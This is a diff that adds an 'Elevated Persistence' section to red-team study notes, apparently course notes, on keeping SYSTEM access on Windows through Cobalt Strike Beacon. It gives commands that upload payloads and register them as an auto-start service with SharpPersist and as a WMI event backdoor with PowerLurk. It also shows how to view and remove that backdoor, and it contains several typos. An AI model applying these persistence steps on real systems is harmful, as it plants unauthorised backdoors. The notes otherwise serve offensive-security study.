@@ -236,3 +236,56 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCAAA}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCAAA}' because it does not exist.
 ```
+
+# Elevated Persistence
+
+We can also add persistence mechanisms to mantain `SYSTEM` access.
+
+> **Note**: SYSTEM processes cannot authenticate to a web proxy, so we can't use HTTP Beacones, use P2P or DNS Beacons instead.
+
+## Windows Services
+
+We can create our own service with `AUTO_START` with `SharpPersist`.
+
+```
+beacon> upload C:\Payloads\dns-svc.exe
+beacon> execute-assembly .\SharpPersist.exe -t service -c "C:\Windows\dns-svc.exe" -n "dns-svc" -m add
+
+[*] INFO: Adding service persistence
+[*] INFO: Command: C:\Windows\dns-svc.exe
+[*] INFO: Command Args: 
+[*] INFO: Service Name: dns-svc
+
+[+] SUCCESS: Service persistence added
+```
+
+This will create a new service in a STOPPED state, but with the START_TYPE set to AUTO_START, which means that whe service won't run until the machine is rebooted.
+
+## WMI Event Subscriptions
+
+Persistence via WMI events can be achieved by leveraging the following three classes:
+
+* **EventCostumer**: Is the action that we want to perform (execute a payload).
+* **EventFilter**: The trigger that we can act upon.
+* **FilterToConsumerBinding**: Links an EventCostumer and EventFilter together.
+
+`PowerLuk` is a PowerShell tool for building these WMI queries.
+
+* [https://github.com/Sw4mpf0x/PowerLurk](https://github.com/Sw4mpf0x/PowerLurk)
+
+```
+beacon> upload C:\Payloads\dns_x64.exe
+beacon> powershell-import .\PowerLuk.ps1
+beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermamentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
+```
+
+You can view these classes with:
+
+```powershell
+Get-WmiEvent -Name WmiBackdoor
+```
+We can remove the backdoor with:
+
+```powershell
+Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject
+```
